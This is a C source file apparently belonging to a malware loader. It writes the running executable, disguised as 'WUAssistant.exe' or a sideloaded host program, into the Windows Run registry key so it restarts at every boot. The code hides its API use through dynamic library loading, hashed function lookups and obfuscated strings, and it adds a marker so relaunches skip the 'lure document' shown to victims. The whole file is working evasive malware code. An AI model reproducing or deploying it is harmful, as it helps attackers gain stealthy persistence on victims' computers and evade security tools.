// =============================================
// Persist.c - Registry Run-Key Persistence
//
// Writes the current EXE path (or host EXE for sideload builds) to:
//
//   HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run   (UAC builds)
//   HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run   (non-UAC builds)
//
// Root key is chosen at compile time:
//   REQUIRE_ADMINISTRATOR  (EXE UAC)  → HKLM
//   REQUIRE_ELEVATION      (DLL UAC)  → HKLM
//   (neither)                         → HKCU
//
// Build types:
//   exe          → persists WUAssistant.exe (HKCU, medium IL)
//   exe uac      → persists WUAssistant.exe (HKLM, high IL)
//   sideload     → persists host EXE        (HKCU, medium IL)
//   sideload uac → persists host EXE        (HKLM, high IL)
//
// advapi32 is loaded dynamically so it does not appear in the IAT.
// Registry function pointers are resolved by JOAAT hash (no plaintext names).
// =============================================

#include "Common.h"

// ---------------------------------------------------------------------------
// Inline ASCII → WCHAR helper (copies src to dst, null-terminates)
// ---------------------------------------------------------------------------
static VOID Pers_A2W(WCHAR* dst, const CHAR* src) {
    while (*src) *dst++ = (WCHAR)(unsigned char)*src++;
    *dst = L'\0';
}

// ---------------------------------------------------------------------------
// InstallPersistence
// Writes the current process's EXE path as a REG_SZ run-key value.
// Silent no-op on any failure — never crashes the loader.
// ---------------------------------------------------------------------------
BOOL InstallPersistence(IN PAPI_HASHING pApi) {

    if (!pApi || !pApi->pLoadLibraryA || !pApi->pGetProcAddress)
        return FALSE;

    // --- Load advapi32 dynamically (not in IAT) ---
    BYTE xAdvapi32[] = XSTR_ADVAPI32_DLL;
    DEOBF(xAdvapi32);
    PVOID pAdvapi32 = pApi->pLoadLibraryA((LPCSTR)xAdvapi32);
    if (!pAdvapi32) {
        LOG("[!] Persist: advapi32 load failed");
        return FALSE;
    }

    // --- Resolve registry functions by hash (no plaintext API names) ---
    typedef LONG (WINAPI* fnRegOpenKeyExW)(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
    typedef LONG (WINAPI* fnRegSetValueExW)(HKEY, LPCWSTR, DWORD, DWORD, const BYTE*, DWORD);
    typedef LONG (WINAPI* fnRegCloseKey)(HKEY);

    fnRegOpenKeyExW  pRegOpenKeyExW  = (fnRegOpenKeyExW) FetchExportAddress(pAdvapi32, RegOpenKeyExW_JOAAT);
    fnRegSetValueExW pRegSetValueExW = (fnRegSetValueExW)FetchExportAddress(pAdvapi32, RegSetValueExW_JOAAT);
    fnRegCloseKey    pRegCloseKey    = (fnRegCloseKey)   FetchExportAddress(pAdvapi32, RegCloseKey_JOAAT);

    if (!pRegOpenKeyExW || !pRegSetValueExW || !pRegCloseKey) {
        LOG("[!] Persist: registry API resolution failed");
        return FALSE;
    }

    // --- Resolve GetModuleFileNameW from kernel32 ---
    PVOID pKernel32 = FindLoadedModuleW(L"KERNEL32.DLL");
    if (!pKernel32) return FALSE;

    typedef DWORD (WINAPI* fnGetModFNW)(HMODULE, LPWSTR, DWORD);
    fnGetModFNW pGetModFNW = (fnGetModFNW)FetchExportAddress(pKernel32, GetModuleFileNameW_JOAAT);
    if (!pGetModFNW) return FALSE;

    // --- Get current EXE full path (WCHAR) ---
    //     For sideload builds, GetModuleFileNameW(NULL) returns the HOST EXE,
    //     which is exactly what we want to persist.
    //     Reserve 4 extra chars for the "/pf" persistence marker appended below.
    WCHAR szExePath[MAX_PATH + 4] = {0};
    DWORD dwPathLen = pGetModFNW(NULL, szExePath, MAX_PATH);
    if (!dwPathLen || dwPathLen >= MAX_PATH) return FALSE;

#ifdef BUILD_DLL
    // Append " /pf" marker so OpenBindFile() can detect persistence relaunches
    // and skip opening the lure document on boot.  The marker is never shown to
    // the user — it lives only in the run-key value string.
    szExePath[dwPathLen + 0] = L' ';
    szExePath[dwPathLen + 1] = L'/';
    szExePath[dwPathLen + 2] = L'p';
    szExePath[dwPathLen + 3] = L'f';
    szExePath[dwPathLen + 4] = L'\0';
    dwPathLen += 4;
#endif

    // --- Decode run-key subpath and value name ---
    BYTE xRunKey[]  = XSTR_RUN_KEY_PATH;  DEOBF(xRunKey);
    BYTE xValName[] = XSTR_PERSIST_NAME;  DEOBF(xValName);

    // Convert ASCII obfuscated strings to WCHAR
    // XSTR_RUN_KEY_PATH is "SOFTWARE\Microsoft\Windows\CurrentVersion\Run" (48 chars)
    WCHAR wszRunKey[64]  = {0};
    WCHAR wszValName[32] = {0};
    Pers_A2W(wszRunKey,  (CHAR*)xRunKey);
    Pers_A2W(wszValName, (CHAR*)xValName);

    // --- Choose root key based on elevation level at compile time ---
#if defined(REQUIRE_ADMINISTRATOR) || defined(REQUIRE_ELEVATION)
    HKEY hRoot = HKEY_LOCAL_MACHINE;   // high integrity (UAC builds)
#else
    HKEY hRoot = HKEY_CURRENT_USER;    // medium integrity (non-UAC builds)
#endif

    // --- Write the persistence entry ---
    HKEY hKey = NULL;
    LONG lRet = pRegOpenKeyExW(hRoot, wszRunKey, 0, KEY_SET_VALUE, &hKey);
    if (lRet != 0) {
        LOG("[!] Persist: RegOpenKeyExW failed");
        return FALSE;
    }

    DWORD cbData = (DWORD)((dwPathLen + 1) * sizeof(WCHAR));
    lRet = pRegSetValueExW(hKey, wszValName, 0, REG_SZ, (const BYTE*)szExePath, cbData);
    pRegCloseKey(hKey);

    if (lRet != 0) {
        LOG("[!] Persist: RegSetValueExW failed");
        return FALSE;
    }

    LOG("[+] Persist: run-key written");
    return TRUE;
}
